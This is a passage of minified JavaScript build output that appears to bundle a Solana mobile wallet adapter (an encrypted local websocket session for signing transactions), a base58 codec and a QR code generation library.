URLs")}function RE(n){return new DataView(n).getUint32(0,!1)}function rB(n,e){return un(this,void 0,void 0,function*(){tB();const t=yield U3(),i=`ws://localhost:${yield X3(t.publicKey,e==null?void 0:e.baseUri)}/solana-wallet`;let s;const o=(()=>{const h=[...CE.retryDelayScheduleMs];return()=>h.length>1?h.shift():h[0]})();let a=1,l=0,u={__type:"disconnected"};return new Promise((h,f)=>{let m;const v={},x=()=>un(this,void 0,void 0,function*(){if(u.__type!=="connecting"){console.warn(`Expected adapter state to be \`connecting\` at the moment the websocket opens. Got \`${u.__type}\`.`);return}m.removeEventListener("open",x);const{associationKeypair:H}=u,q=yield am();m.send(yield sm(q.publicKey,H.privateKey)),u={__type:"hello_req_sent",associationPublicKey:H.publicKey,ecdhPrivateKey:q.privateKey}}),k=H=>{H.wasClean?u={__type:"disconnected"}:f(new cs(ls.ERROR_SESSION_CLOSED,`The wallet session dropped unexpectedly (${H.code}: ${H.reason}).`,{closeEvent:H})),b()},I=H=>un(this,void 0,void 0,function*(){b(),Date.now()-s>=CE.timeoutMs?f(new cs(ls.ERROR_SESSION_TIMEOUT,`Failed to connect to the wallet websocket at ${i}.`)):(yield new Promise(q=>{const L=o();E=window.setTimeout(q,L)}),U())}),S=H=>un(this,void 0,void 0,function*(){const q=yield H.data.arrayBuffer();switch(u.__type){case"connecting":if(q.byteLength!==0)throw new Error("Encountered unexpected message while connecting");const L=yield am();m.send(yield sm(L.publicKey,t.privateKey)),u={__type:"hello_req_sent",associationPublicKey:t.publicKey,ecdhPrivateKey:L.privateKey};break;case"connected":try{const N=q.slice(0,Fo),B=RE(N);if(B!==l+1)throw new Error("Encrypted message has invalid sequence number");l=B;const z=yield V3(q,u.sharedSecret),W=v[z.id];delete v[z.id],W.resolve(z.result)}catch(N){if(N instanceof yx){const B=v[N.jsonRpcMessageId];delete v[N.jsonRpcMessageId],B.reject(N)}else throw N}break;case"hello_req_sent":{if(q.byteLength===0){const K=yield am();m.send(yield sm(K.publicKey,t.privateKey)),u={__type:"hello_req_sent",associationPublicKey:t.publicKey,ecdhPrivateKey:K.privateKey};break}const N=yield F3(q,u.associationPublicKey,u.ecdhPrivateKey),B=q.slice(wx),z=B.byteLength!==0?yield(()=>un(this,void 0,void 0,function*(){const K=B.slice(0,Fo),T=RE(K);if(T!==l+1)throw new Error("Encrypted message has invalid sequence number");return l=T,z3(B,N)}))():{protocol_version:"legacy"};u={__type:"connected",sharedSecret:N,sessionProperties:z};const W=M3(z.protocol_version,(K,T)=>un(this,void 0,void 0,function*(){const d=a++;return m.send(yield j3({id:d,jsonrpc:"2.0",method:K,params:T??{}},N)),new Promise((_,C)=>{v[d]={resolve(M){switch(K){case"authorize":case"reauthorize":{const{wallet_uri_base:R}=M;if(R!=null)try{nB(R)}catch(j){C(j);return}break}}_(M)},reject:C}})}));try{h(yield n(W))}catch(K){f(K)}finally{b(),m.close()}break}}});let b,E;const U=()=>{b&&b(),u={__type:"connecting",associationKeypair:t},s===void 0&&(s=Date.now()),m=new WebSocket(i,[eB]),m.addEventListener("open",x),m.addEventListener("close",k),m.addEventListener("error",I),m.addEventListener("message",S),b=()=>{window.clearTimeout(E),m.removeEventListener("open",x),m.removeEventListener("close",k),m.removeEventListener("error",I),m.removeEventListener("message",S)}};U()})})}function iB(n){if(n.length>=255)throw new TypeError("Alphabet too long");for(var e=new Uint8Array(256),t=0;t<e.length;t++)e[t]=255;for(var r=0;r<n.length;r++){var i=n.charAt(r),s=i.charCodeAt(0);if(e[s]!==255)throw new TypeError(i+" is ambiguous");e[s]=r}var o=n.length,a=n.charAt(0),l=Math.log(o)/Math.log(256),u=Math.log(256)/Math.log(o);function h(v){if(v instanceof Uint8Array||(ArrayBuffer.isView(v)?v=new Uint8Array(v.buffer,v.byteOffset,v.byteLength):Array.isArray(v)&&(v=Uint8Array.from(v))),!(v instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(v.length===0)return"";for(var x=0,k=0,I=0,S=v.length;I!==S&&v[I]===0;)I++,x++;for(var b=(S-I)*u+1>>>0,E=new Uint8Array(b);I!==S;){for(var U=v[I],H=0,q=b-1;(U!==0||H<k)&&q!==-1;q--,H++)U+=256*E[q]>>>0,E[q]=U%o>>>0,U=U/o>>>0;if(U!==0)throw new Error("Non-zero carry");k=H,I++}for(var L=b-k;L!==b&&E[L]===0;)L++;for(var N=a.repeat(x);L<b;++L)N+=n.charAt(E[L]);return N}function f(v){if(typeof v!="string")throw new TypeError("Expected String");if(v.length===0)return new Uint8Array;for(var x=0,k=0,I=0;v[x]===a;)k++,x++;for(var S=(v.length-x)*l+1>>>0,b=new Uint8Array(S);v[x];){var E=v.charCodeAt(x);if(E>255)return;var U=e[E];if(U===255)return;for(var H=0,q=S-1;(U!==0||H<I)&&q!==-1;q--,H++)U+=o*b[q]>>>0,b[q]=U%256>>>0,U=U/256>>>0;if(U!==0)throw new Error("Non-zero carry");I=H,x++}for(var L=S-I;L!==S&&b[L]===0;)L++;for(var N=new Uint8Array(k+(S-L)),B=k;L!==S;)N[B++]=b[L++];return N}function m(v){var x=f(v);if(x)return x;throw new Error("Non-base"+o+" character")}return{encode:h,decodeUnsafe:f,decode:m}}var sB=iB;const oB=sB,aB="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";var lB=oB(aB);const cB=ca(lB);function lm(n,e){var t={};for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&e.indexOf(r)<0&&(t[r]=n[r]);if(n!=null&&typeof Object.getOwnPropertySymbols=="function")for(var i=0,r=Object.getOwnPropertySymbols(n);i<r.length;i++)e.indexOf(r[i])<0&&Object.prototype.propertyIsEnumerable.call(n,r[i])&&(t[r[i]]=n[r[i]]);return t}function nf(n,e,t,r){function i(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(h){try{u(r.next(h))}catch(f){o(f)}}function l(h){try{u(r.throw(h))}catch(f){o(f)}}function u(h){h.done?s(h.value):i(h.value).then(a,l)}u((r=r.apply(n,e||[])).next())})}function Ix(n){return window.btoa(String.fromCharCode.call(null,...n))}function cm(n){return new Uint8Array(window.atob(n).split("").map(e=>e.charCodeAt(0)))}function ME(n){const e="version"in n?n.serialize():n.serialize({requireAllSignatures:!1,verifySignatures:!1});return Ix(e)}function uB(n){const t=n[0]*Nu+1;return Gw.deserializeMessageVersion(n.slice(t,n.length))==="legacy"?xr.from(n):Lu.deserialize(n)}function hB(n,e){return nf(this,void 0,void 0,function*(){return yield rB(r=>{const i=new Proxy({},{get(s,o){if(s[o]==null)switch(o){case"signAndSendTransactions":s[o]=function(a){var{minContextSlot:l,commitment:u,skipPreflight:h,maxRetries:f,waitForCommitmentToSendNextTransaction:m,transactions:v}=a,x=lm(a,["minContextSlot","commitment","skipPreflight","maxRetries","waitForCommitmentToSendNextTransaction","transactions"]);return nf(this,void 0,void 0,function*(){const k=v.map(ME),I={min_context_slot:l,commitment:u,skip_preflight:h,max_retries:f,wait_for_commitment_to_send_next_transaction:m},{signatures:S}=yield r.signAndSendTransactions(Object.assign(Object.assign(Object.assign({},x),Object.values(I).some(E=>E!=null)?{options:I}:null),{payloads:k}));return S.map(cm).map(cB.encode)})};break;case"signMessages":s[o]=function(a){var{payloads:l}=a,u=lm(a,["payloads"]);return nf(this,void 0,void 0,function*(){const h=l.map(Ix),{signed_payloads:f}=yield r.signMessages(Object.assign(Object.assign({},u),{payloads:h}));return f.map(cm)})};break;case"signTransactions":s[o]=function(a){var{transactions:l}=a,u=lm(a,["transactions"]);return nf(this,void 0,void 0,function*(){const h=l.map(ME),{signed_payloads:f}=yield r.signTransactions(Object.assign(Object.assign({},u),{payloads:h}));return f.map(cm).map(uB)})};break;default:{s[o]=r[o];break}}return s[o]},defineProperty(){return!1},deleteProperty(){return!1}});return n(i)},e)})}var fB=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then},Sx={},Dr={};let iv;const dB=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];Dr.getSymbolSize=function(e){if(!e)throw new Error('"version" cannot be null or undefined');if(e<1||e>40)throw new Error('"version" should be in range from 1 to 40');return e*4+17};Dr.getSymbolTotalCodewords=function(e){return dB[e]};Dr.getBCHDigit=function(n){let e=0;for(;n!==0;)e++,n>>>=1;return e};Dr.setToSJISFunction=function(e){if(typeof e!="function")throw new Error('"toSJISFunc" is not a valid function.');iv=e};Dr.isKanjiModeEnabled=function(){return typeof iv<"u"};Dr.toSJIS=function(e){return iv(e)};var Rp={};(function(n){n.L={bit:1},n.M={bit:0},n.Q={bit:3},n.H={bit:2};function e(t){if(typeof t!="string")throw new Error("Param is not a string");switch(t.toLowerCase()){case"l":case"low":return n.L;case"m":case"medium":return n.M;case"q":case"quartile":return n.Q;case"h":case"high":return n.H;default:throw new Error("Unknown EC Level: "+t)}}n.isValid=function(r){return r&&typeof r.bit<"u"&&r.bit>=0&&r.bit<4},n.from=function(r,i){if(n.isValid(r))return r;try{return e(r)}catch{return i}}})(Rp);function Tx(){this.buffer=[],this.length=0}Tx.prototype={get:function(n){const e=Math.floor(n/8);return(this.buffer[e]>>>7-n%8&1)===1},put:function(n,e){for(let t=0;t<e;t++)this.putBit((n>>>e-t-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(n){const e=Math.floor(this.length/8);this.buffer.length<=e&&this.buffer.push(0),n&&(this.buffer[e]|=128>>>this.length%8),this.length++}};var pB=Tx;function ah(n){if(!n||n<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=n,this.data=new Uint8Array(n*n),this.reservedBit=new Uint8Array(n*n)}ah.prototype.set=function(n,e,t,r){const i=n*this.size+e;this.data[i]=t,r&&(this.reservedBit[i]=!0)};ah.prototype.get=function(n,e){return this.data[n*this.size+e]};ah.prototype.xor=function(n,e,t){this.data[n*this.size+e]^=t};ah.prototype.isReserved=function(n,e){return this.reservedBit[n*this.size+e]};var gB=ah,Ax={};(function(n){const e=Dr.getSymbolSize;n.getRowColCoords=function(r){if(r===1)return[];const i=Math.floor(r/7)+2,s=e(r),o=s===145?26:Math.ceil((s-13)/(2*i-2))*2,a=[s-7];for(let l=1;l<i-1;l++)a[l]=a[l-1]-o;return a.push(6),a.reverse()},n.getPositions=function(r){const i=[],s=n.getRowColCoords(r),o=s.length;for(let a=0;a<o;a++)for(let l=0;l<o;l++)a===0&&l===0||a===0&&l===o-1||a===o-1&&l===0||i.push([s[a],s[l]]);return i}})(Ax);var bx={};const mB=Dr.getSymbolSize,NE=7;bx.getPositions=function(e){const t=mB(e);return[[0,0],[t-NE,0],[0,t-NE]]};var xx={};(function(n){n.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};const e={N1:3,N2:3,N3:40,N4:10};n.isValid=function(i){return i!=null&&i!==""&&!isNaN(i)&&i>=0&&i<=7},n.from=function(i){return n.isValid(i)?parseInt(i,10):void 0},n.getPenaltyN1=function(i){const s=i.size;let o=0,a=0,l=0,u=null,h=null;for(let f=0;f<s;f++){a=l=0,u=h=null;for(let m=0;m<s;m++){let v=i.get(f,m);v===u?a++:(a>=5&&(o+=e.N1+(a-5)),u=v,a=1),v=i.get(m,f),v===h?l++:(l>=5&&(o+=e.N1+(l-5)),h=v,l=1)}a>=5&&(o+=e.N1+(a-5)),l>=5&&(o+=e.N1+(l-5))}return o},n.getPenaltyN2=function(i){const s=i.size;let o=0;for(let a=0;a<s-1;a++)for(let l=0;l<s-1;l++){const u=i.get(a,l)+i.get(a,l+1)+i.get(a+1,l)+i.get(a+1,l+1);(u===4||u===0)&&o++}return o*e.N2},n.getPenaltyN3=function(i){const s=i.size;let o=0,a=0,l=0;for(let u=0;u<s;u++){a=l=0;for(let h=0;h<s;h++)a=a<<1&2047|i.get(u,h),h>=10&&(a===1488||a===93)&&o++,l=l<<1&2047|i.get(h,u),h>=10&&(l===1488||l===93)&&o++}return o*e.N3},n.getPenaltyN4=function(i){let s=0;const o=i.data.length;for(let l=0;l<o;l++)s+=i.data[l];return Math.abs(Math.ceil(s*100/o/5)-10)*e.N4};function t(r,i,s){switch(r){case n.Patterns.PATTERN000:return(i+s)%2===0;case n.Patterns.PATTERN001:return i%2===0;case n.Patterns.PATTERN010:return s%3===0;case n.Patterns.PATTERN011:return(i+s)%3===0;case n.Patterns.PATTERN100:return(Math.floor(i/2)+Math.floor(s/3))%2===0;case n.Patterns.PATTERN101:return i*s%2+i*s%3===0;case n.Patterns.PATTERN110:return(i*s%2+i*s%3)%2===0;case n.Patterns.PATTERN111:return(i*s%3+(i+s)%2)%2===0;default:throw new Error("bad maskPattern:"+r)}}n.applyMask=function(i,s){const o=s.size;for(let a=0;a<o;a++)for(let l=0;l<o;l++)s.isReserved(l,a)||s.xor(l,a,t(i,l,a))},n.getBestMask=function(i,s){const o=Object.keys(n.Patterns).length;let a=0,l=1/0;for(let u=0;u<o;u++){s(u),n.applyMask(u,i);const h=n.getPenaltyN1(i)+n.getPenaltyN2(i)+n.getPenaltyN3(i)+n.getPenaltyN4(i);n.applyMask(u,i),h<l&&(l=h,a=u)}return a}})(xx);var Mp={};const Fs=Rp,rf=[1,1,1,1,1,1,1,1,1,1,2,2,1,2,2,4,1,2,4,4,2,4,4,4,2,4,6,5,2,4,6,6,2,5,8,8,4,5,8,8,4,5,8,11,4,8,10,11,4,9,12,16,4,9,16,16,6,10,12,18,6,10,17,16,6,11,16,19,6,13,18,21,7,14,21,25,8,16,20,25,8,17,23,25,9,17,23,34,9,18,25,30,10,20,27,32,12,21,29,35,12,23,34,37,12,25,34,40,13,26,35,42,14,28,38,45,15,29,40,48,16,31,43,51,17,33,45,54,18,35,48,57,19,37,51,60,19,38,53,63,20,40,56,66,21,43,59,70,22,45,62,74,24,47,65,77,25,49,68,81],sf=[7,10,13,17,10,16,22,28,15,26,36,44,20,36,52,64,26,48,72,88,36,64,96,112,40,72,108,130,48,88,132,156,60,110,160,192,72,130,192,224,80,150,224,264,96,176,260,308,104,198,288,352,120,216,320,384,132,240,360,432,144,280,408,480,168,308,448,532,180,338,504,588,196,364,546,650,224,416,600,700,224,442,644,750,252,476,690,816,270,504,750,900,300,560,810,960,312,588,870,1050,336,644,952,1110,360,700,1020,1200,390,728,1050,1260,420,784,1140,1350,450,812,1200,1440,480,868,1290,1530,510,924,1350,1620,540,980,1440,1710,570,1036,1530,1800,570,1064,1590,1890,600,1120,1680,1980,630,1204,1770,2100,660,1260,1860,2220,720,1316,1950,2310,750,1372,2040,2430];Mp.getBlocksCount=function(e,t){switch(t){case Fs.L:return rf[(e-1)*4+0];case Fs.M:return rf[(e-1)*4+1];case Fs.Q:return rf[(e-1)*4+2];case Fs.H:return rf[(e-1)*4+3];default:return}};Mp.getTotalCodewordsCount=function(e,t){switch(t){case Fs.L:return sf[(e-1)*4+0];case Fs.M:return sf[(e-1)*4+1];case Fs.Q:return sf[(e-1)*4+2];case Fs.H:return sf[(e-1)*4+3];default:return}};var kx={},Np={};const tu=new Uint8Array(512),Id=new Uint8Array(256);(function(){let e=1;for(let t=0;t<255;t++)tu[t]=e,Id[e]=t,e<<=1,e&256&&(e^=285);for(let t=255;t<512;t++)tu[t]=tu[t-255]})();Np.log=function(e){if(e<1)throw new Error("log("+e+")");return Id[e]};Np.exp=function(e){return tu[e]};Np.mul=function(e,t){return e===0||t===0?0:tu[Id[e]+Id[t]]};(function(n){const e=Np;n.mul=function(r,i){const s=new Uint8Array(r.length+i.length-1);for(let o=0;o<r.length;o++)for(let a=0;a<i.length;a++)s[o+a]^=e.mul(r[o],i[a]);return s},n.mod=function(r,i){let s=new Uint8Array(r);for(;s.length-i.length>=0;){const o=s[0];for(let l=0;l<i.length;l++)s[l]^=e.mul(i[l],o);let a=0;for(;a<s.length&&s[a]===0;)a++;s=s.slice(a)}return s},n.generateECPolynomial=function(r){let i=new Uint8Array([1]);for(let s=0;s<r;s++)i=n.mul(i,new Uint8Array([1,e.exp(s)]));return i}})(kx);const Cx=kx;function sv(n){this.genPoly=void 0,this.degree=n,this.degree&&this.initialize(this.degree)}sv.prototype.initialize=function(e){this.degree=e,this.genPoly=Cx.generateECPolynomial(this.degree)};sv.prototype.encode=function(e){if(!this.genPoly)throw new Error("Encoder not initialized");const t=new Uint8Array(e.length+this.degree);t.set(e);const r=Cx.mod(t,this.genPoly),i=this.degree-r.length;if(i>0){const s=new Uint8Array(this.degree);return s.set(r,i),s}return r};var yB=sv,Rx={},wo={},ov={};ov.isValid=function(e){return!isNaN(e)&&e>=1&&e<=40};var Li={};const Mx="[0-9]+",wB="[A-Z $%*+\\-./:]+";let Bu="(?:[u3000-u303F]|[u3040-u309F]|[u30A0-u30FF]|[uFF00-uFFEF]|[u4E00-u9FAF]|[u2605-u2606]|[u2190-u2195]|u203B|[u2010u2015u2018u2019u2025u2026u201Cu201Du2225u2260]|[u0391-u0451]|[u00A7u00A8u00B1u00B4u00D7u00F7])+";Bu=Bu.replace(/u/g,"\\u");const vB="(?:(?![A-Z0-9 $%*+\\-./:]|"+Bu+`)(?:.|[\r
]))+`;Li.KANJI=new RegExp(Bu,"g");Li.BYTE_KANJI=new RegExp("[^A-Z0-9 $%*+\\-./:]+","g");Li.BYTE=new RegExp(vB,"g");Li.NUMERIC=new RegExp(Mx,"g");Li.ALPHANUMERIC=new RegExp(wB,"g");const _B=new RegExp("^"+Bu+"$"),EB=new RegExp("^"+Mx+"$"),IB=new RegExp("^[A-Z0-9 $%*+\\-./:]+$");Li.testKanji=function(e){return _B.test(e)};Li.testNumeric=function(e){return EB.test(e)};Li.testAlphanumeric=function(e){return IB.test(e)};(function(n){const e=ov,t=Li;n.NUMERIC={id:"Numeric",bit:1,ccBits:[10,12,14]},n.ALPHANUMERIC={id:"Alphanumeric",bit:2,ccBits:[9,11,13]},n.BYTE={id:"Byte",bit:4,ccBits:[8,16,16]},n.KANJI={id:"Kanji",bit:8,ccBits:[8,10,12]},n.MIXED={bit:-1},n.getCharCountIndicator=function(s,o){if(!s.ccBits)throw new Error("Invalid mode: "+s);if(!e.isValid(o))throw new Error("Invalid version: "+o);return o>=1&&o<10?s.ccBits[0]:o<27?s.ccBits[1]:s.ccBits[2]},n.getBestModeForData=function(s){return t.testNumeric(s)?n.NUMERIC:t.testAlphanumeric(s)?n.ALPHANUMERIC:t.testKanji(s)?n.KANJI:n.BYTE},n.toString=function(s){if(s&&s.id)return s.id;throw new Error("Invalid mode")},n.isValid=function(s){return s&&s.bit&&s.ccBits};function r(i){if(typeof i!="string")throw new Error("Param is not a string");switch(i.toLowerCase()){case"numeric":return n.NUMERIC;case"alphanumeric":return n.ALPHANUMERIC;case"kanji":return n.KANJI;case"byte":return n.BYTE;default:throw new Error("Unknown mode: "+i)}}n.from=function(s,o){if(n.isValid(s))return s;try{return r(s)}catch{return o}}})(wo);(function(n){const e=Dr,t=Mp,r=Rp,i=wo,s=ov,o=7973,a=e.getBCHDigit(o);function l(m,v,x){for(let k=1;k<=40;k++)if(v<=n.getCapacity(k,x,m))return k}function u(m,v){return i.getCharCountIndicator(m,v)+4}function h(m,v){let x=0;return m.forEach(function(k){const I=u(k.mode,v);x+=I+k.getBitsLength()}),x}function f(m,v){for(let x=1;x<=40;x++)if(h(m,x)<=n.getCapacity(x,v,i.MIXED))return x}n.from=function(v,x){return s.isValid(v)?parseInt(v,10):x},n.getCapacity=function(v,x,k){if(!s.isValid(v))throw new Error("Invalid QR Code version");typeof k>"u"&&(k=i.BYTE);const I=e.getSymbolTotalCodewords(v),S=t.getTotalCodewordsCount(v,x),b=(I-S)*8;if(k===i.MIXED)return b;const E=b-u(k,v);switch(k){case i.NUMERIC:return Math.floor(E/10*3);case i.ALPHANUMERIC:return Math.floor(E/11*2);case i.KANJI:return Math.floor(E/13);case i.BYTE:default:return Math.floor(E/8)}},n.getBestVersionForData=function(v,x){let k;const I=r.from(x,r.M);if(Array.isArray(v)){if(v.length>1)return f(v,I);if(v.length===0)return 1;k=v[0]}else k=v;return l(k.mode,k.getLength(),I)},n.getEncodedBits=function(v){if(!s.isValid(v)||v<7)throw new Error("Invalid QR Code version");let x=v<<12;for(;e.getBCHDigit(x)-a>=0;)x^=o<<e.getBCHDigit(x)-a;return v<<12|x}})(Rx);var Nx={};const F0=Dr,Px=1335,SB=21522,PE=F0.getBCHDigit(Px);Nx.getEncodedBits=function(e,t){const r=e.bit<<3|t;let i=r<<10;for(;F0.getBCHDigit(i)-PE>=0;)i^=Px<<F0.getBCHDigit(i)-PE;return(r<<10|i)^SB};var Lx={};const TB=wo;function Ml(n){this.mode=TB.NUMERIC,this.data=n.toString()}Ml.getBitsLength=function(e){return 10*Math.floor(e/3)+(e%3?e%3*3+1:0)};Ml.prototype.getLength=function(){return this.data.length};Ml.prototype.getBitsLength=function(){return Ml.getBitsLength(this.data.length)};Ml.prototype.write=function(e){let t,r,i;for(t=0;t+3<=this.data.length;t+=3)r=this.data.substr(t,3),i=parseInt(r,10),e.put(i,10);const s=this.data.length-t;s>0&&(r=this.data.substr(t),i=parseInt(r,10),e.put(i,s*3+1))};var AB=Ml;const bB=wo,um=["0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"," ","$","%","*","+","-",".","/",":"];function Nl(n){this.mode=bB.ALPHANUMERIC,this.data=n}Nl.getBitsLength=function(e){return 11*Math.floor(e/2)+6*(e%2)};Nl.prototype.getLength=function(){return this.data.length};Nl.prototype.getBitsLength=function(){return Nl.getBitsLength(this.data.length)};Nl.prototype.write=function(e){let t;for(t=0;t+2<=this.data.length;t+=2){let r=um.indexOf(this.data[t])*45;r+=um.indexOf(this.data[t+1]),e.put(r,11)}this.data.length%2&&e.put(um.indexOf(this.data[t]),6)};var xB=Nl;const kB=wo;function Pl(n){this.mode=kB.BYTE,typeof n=="string"?this.data=new TextEncoder().encode(n):this.data=new Uint8Array(n)}Pl.getBitsLength=function(e){return e*8};Pl.prototype.getLength=function(){return this.data.length};Pl.prototype.getBitsLength=function(){return Pl.getBitsLength(this.data.length)};Pl.prototype.write=function(n){for(let e=0,t=this.data.length;e<t;e++)n.put(this.data[e],8)};var CB=Pl;const RB=wo,MB=Dr;function Ll(n){this.mode=RB.KANJI,this.data=n}Ll.getBitsLength=function(e){return e*13};Ll.prototype.getLength=function(){return this.data.length};Ll.prototype.getBitsLength=function(){return Ll.getBitsLength(this.data.length)};Ll.prototype.write=function(n){let e;for(e=0;e<this.data.length;e++){let t=MB.toSJIS(this.data[e]);if(t>=33088&&t<=40956)t-=33088;else if(t>=57408&&t<=60351)t-=49472;else throw new Error("Invalid SJIS character: "+this.data[e]+`
Make sure your charset is UTF-8`);t=(t>>>8&255)*192+(t&255),n.put(t,13)}};var NB=Ll,Dx={exports:{}};(function(n){var e={single_source_shortest_paths:function(t,r,i){var s={},o={};o[r]=0;var a=e.PriorityQueue.make();a.push(r,0);for(var l,u,h,f,m,v,x,k,I;!a.empty();){l=a.pop(),u=l.value,f=l.cost,m=t[u]||{};for(h in m)m.hasOwnProperty(h)&&(v=m[h],x=f+v,k=o[h],I=typeof o[h]>"u",(I||k>x)&&(o[h]=x,a.push(h,x),s[h]=u))}if(typeof i<"u"&&typeof o[i]>"u"){var S=["Could not find a path from ",r," to ",i,"."].join("");throw new Error(S)}return s},extract_shortest_path_from_predecessor_list:function(t,r){for(var i=[],s=r;s;)i.push(s),t[s],s=t[s];return i.reverse(),i},find_path:function(t,r,i){var s=e.single_source_shortest_paths(t,r,i);return e.extract_shortest_path_from_predecessor_list(s,i)},PriorityQueue:{make:function(t){var r=e.PriorityQueue,i={},s;t=t||{};for(s in r)r.hasOwnProperty(s)&&(i[s]=r[s]);return i.queue=[],i.sorter=t.sorter||r.default_sorter,i},default_sorter:function(t,r){return t.cost-r.cost},push:function(t,r){var i={value:t,cost:r};this.queue.push(i),this.queue.sort(this.sorter)},pop:function(){return this.queue.shift()},empty:function(){return this.queue.length===0}}};n.exports=e})(Dx);var PB=Dx.exports;(function(n){const e=wo,t=AB,r=xB,i=CB,s=NB,o=Li,a=Dr,l=PB;function u(S){return unescape(encodeURIComponent(S)).length}function h(S,b,E){const U=[];let H;for(;(H=S.exec(E))!==null;)U.push({data:H[0],index:H.index,mode:b,length:H[0].length});return U}function f(S){const b=h(o.NUMERIC,e.NUMERIC,S),E=h(o.ALPHANUMERIC,e.ALPHANUMERIC,S);let U,H;return a.isKanjiModeEnabled()?(U=h(o.BYTE,e.BYTE,S),H=h(o.KANJI,e.KANJI,S)):(U=h(o.BYTE_KANJI,e.BYTE,S),H=[]),b.concat(E,U,H).sort(function(L,N){return L.index-N.index}).map(function(L){return{data:L.data,mode:L.mode,length:L.length}})}function m(S,b){switch(b){case e.NUMERIC:return t.getBitsLength(S);case e.ALPHANUMERIC:return r.getBitsLength(S);case e.KANJI:return s.getBitsLength(S);case e.BYTE:return i.getBitsLength(S)}}function v(S){return S.reduce(function(b,E){const U=b.length-1>=0?b[b.length-1]:null;return U&&U.mode===E.mode?(b[b.length-1].data+=E.data,b):(b.push(E),b)},[])}function x(S){const b=[];for(let E=0;E<S.length;E++){const U=S[E];switch(U.mode){case e.NUMERIC:b.push([U,{data:U.data,mode:e.ALPHANUMERIC,length:U.length},{data:U.data,mode:e.BYTE,length:U.length}]);break;case e.ALPHANUMERIC:b.push([U,{data:U.data,mode:e.BYTE,length:U.length}]);break;case e.KANJI:b.push([U,{data:U.data,mode:e.BYTE,length:u(U.data)}]);break;case e.BYTE:b.push([{data:U.data,mode:e.BYTE,length:u(U.data)}])}}return b}function k(S,b){const E={},U={start:{}};let H=["start"];for(let q=0;q<S.length;q++){const L=S[q],N=[];for(let B=0;B<L.length;B++){const z=L[B],W=""+q+B;N.push(W),E[W]={node:z,lastCount:0},U[W]={};for(let K=0;K<H.length;K++){const T=H[K];E[T]&&E[T].node.mode===z.mode?(U[T][W]=m(E[T].lastCount+z.length,z.mode)-m(E[T].lastCount,z.mode),E[T].lastCount+=z.length):(E[T]&&(E[T].lastCount=z.length),U[T][W]=m(z.length,z.mode)+4+e.getCharCountIndicator(z.mode,b))}}H=N}for(let q=0;q<H.length;q++)U[H[q]].end=0;return{map:U,table:E}}function I(S,b){let E;const U=e.getBestModeForData(S);if(E=e.from(b,U),E!==e.BYTE&&E.bit<U.bit)throw new Error('"'+S+'" cannot be encoded with mode '+e.toString(E)+`.
 Suggested mode is: `+e.toString(U));switch(E===e.KANJI&&!a.isKanjiModeEnabled()&&(E=e.BYTE),E){case e.NUMERIC:return new t(S);case e.ALPHANUMERIC:return new r(S);case e.KANJI:return new s(S);case e.BYTE:return new i(S)}}n.fromArray=function(b){return b.reduce(function(E,U){return typeof U=="string"?E.push(I(U,null)):U.data&&E.push(I(U.data,U.mode)),E},[])},n.fromString=function(b,E){const U=f(b,a.isKanjiModeEnabled()),H=x(U),q=k(H,E),L=l.find_path(q.map,"start","end"),N=[];for(let B=1;B<L.length-1;B++)N.push(q.table[L[B]].node);return n.fromArray(v(N))},n.rawSplit=function(b){return n.fromArray(f(b,a.isKanjiModeEnabled()))}})(Lx);const Pp=Dr,hm=Rp,LB=pB,DB=gB,OB=Ax,BB=bx,z0=xx,W0=Mp,UB=yB,Sd=Rx,jB=Nx,VB=wo,fm=Lx;function FB(n,e){const t=n.size,r=BB.getPositions(e);for(let i=0;i<r.length;i++){const s=r[i][0],o=r[i][1];for(let a=-1;a<=7;a++)if(!(s+a<=-1||t<=s+a))for(let l=-1;l<=7;l++)o+l<=-1||t<=o+l||(a>=0&&a<=6&&(l===0||l===6)||l>=0&&l<=6&&(a===0||a===6)||a>=2&&a<=4&&l>=2&&l<=4?n.set(s+a,o+l,!0,!0):n.set(s+a,o+l,!1,!0))}}function zB(n){const e=n.size;for(let t=8;t<e-8;t++){const r=t%2===0;n.set(t,6,r,!0),n.set(6,t,r,!0)}}function WB(n,e){const t=OB.getPositions(e);for(let r=0;r<t.length;r++){const i=t[r][0],s=t[r][1];for(let o=-2;o<=2;o++)for(let a=-2;a<=2;a++)o===-2||o===2||a===-2||a===2||o===0&&a===0?n.set(i+o,s+a,!0,!0):n.set(i+o,s+a,!1,!0)}}function $B(n,e){const t=n.size,r=Sd.getEncodedBits(e);let i,s,o;for(let a=0;a<18;a++)i=Math.floor(a/3),s=a%3+t-8-3,o=(r>>a&1)===1,n.set(i,s,o,!0),n.set(s,i,o,!0)}function dm(n,e,t){const r=n.size,i=jB.getEncodedBits(e,t);let s,o;for(s=0;s<15;s++)o=(i>>s&1)===1,s<6?n.set(s,8,o,!0):s<8?n.set(s+1,8,o,!0):n.set(r-15+s,8,o,!0),s<8?n.set(8,r-s-1,o,!0):s<9?n.set(8,15-s-1+1,o,!0):n.set(8,15-s-1,o,!0);n.set(r-8,8,1,!0)}function HB(n,e){const t=n.size;let r=-1,i=t-1,s=7,o=0;for(let a=t-1;a>0;a-=2)for(a===6&&a--;;){for(let l=0;l<2;l++)if(!n.isReserved(i,a-l)){let u=!1;o<e.length&&(u=(e[o]>>>s&1)===1),n.set(i,a-l,u),s--,s===-1&&(o++,s=7)}if(i+=r,i<0||t<=i){i-=r,r=-r;break}}}function qB(n,e,t){const r=new LB;t.forEach(function(l){r.put(l.mode.bit,4),r.put(l.getLength(),VB.getCharCountIndicator(l.mode,n)),l.write(r)});const 